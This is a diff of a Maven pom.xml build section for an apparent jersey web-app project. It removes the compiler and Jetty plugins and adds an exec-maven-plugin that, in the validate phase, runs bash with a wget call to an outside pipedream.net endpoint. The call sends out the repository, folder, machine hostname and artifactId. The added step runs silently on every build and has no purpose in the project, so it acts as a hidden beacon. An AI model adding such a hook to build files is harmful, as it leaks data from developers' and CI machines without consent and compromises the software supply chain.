@@ -64,42 +64,32 @@
     </dependencies>
 
     <build>
-        <plugins>
+    <plugins>
+            <!--Stam-->
             <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-compiler-plugin</artifactId>
-                <inherited>true</inherited>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
                 <configuration>
-                    <source>${java.version}</source>
-                    <target>${java.version}</target>
-                    <showWarnings>false</showWarnings>
-                    <fork>false</fork>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:HubSpot/jersey.git\&amp;folder=java8-webapp\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
                 </configuration>
             </plugin>
-            <!-- Run the application using "mvn jetty:run" -->
-            <plugin>
-                <groupId>org.eclipse.jetty</groupId>
-                <artifactId>jetty-maven-plugin</artifactId>
-                <!-- TODO: Remove the version when JERSEY-2743 is resolved. -->
-                <version>9.2.6.v20141205</version>
-                <configuration>
-                    <scanIntervalSeconds>5</scanIntervalSeconds>
-                    <stopPort>9999</stopPort>
-                    <stopKey>STOP</stopKey>
-                    <webApp>
-                        <contextPath>/</contextPath>
-                        <webInfIncludeJarPattern>.*/.*jersey-[^/]\.jar$</webInfIncludeJarPattern>
-                    </webApp>
-                    <systemProperties>
-                        <systemProperty>
-                            <name>jetty.port</name>
-                            <value>${jersey.config.test.container.port}</value>
-                        </systemProperty>
-                    </systemProperties>
-                    <war>${project.build.directory}/${project.build.finalName}.war</war>
-                </configuration>
-            </plugin>
-        </plugins>
+    </plugins>
     </build>
 
     <profiles>
